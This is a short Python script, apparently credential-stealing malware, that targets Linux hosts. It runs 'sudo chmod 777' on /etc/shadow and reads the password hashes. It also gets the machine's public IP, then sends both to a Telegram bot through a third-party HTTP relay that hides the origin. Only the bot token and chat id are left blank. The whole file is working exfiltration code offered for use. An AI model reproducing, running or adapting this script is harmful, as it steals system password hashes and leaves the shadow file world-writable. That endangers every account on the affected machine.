# Crete nomask or tarik
# get file shadow in linux
import os,subprocess
from platform import uname
import requests


def run():
        os.chdir('/etc')
        os.system("sudo chmod 777 shadow")
        

        info_file_shadow=subprocess.getoutput('sudo cat shadow')
        
        # write token bot telegram and chat id my####
        token=""
        chat_id=None

        get_ip=requests.get('https://api.ipify.org/').text

        text= f"""
        <<<- now target ->>>
        ip :{get_ip}
        ----------------
        data : {info_file_shadow}
    """
        sender = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx"
        url_robo =  f'https://api.telegram.org/bot{token}/SendMessage?chat_id={chat_id}&text=' + text
        data = {"UrlBox": url_robo,"AgentList": "Mozilla Firefox","VersionsList": "HTTP/1.1","MethodList": "POST"}
        
        req = requests.post(sender, data)
        if req.status_code == 200:
                print("ok")







def chackOS(system_name):
    state=False
    sys=uname()[0]
    
    if sys==system_name:
        state=True
        return state
    return state

state2=chackOS(system_name="Linux")

if state2:
    run()
else:
    print('noting system linux')
    exit()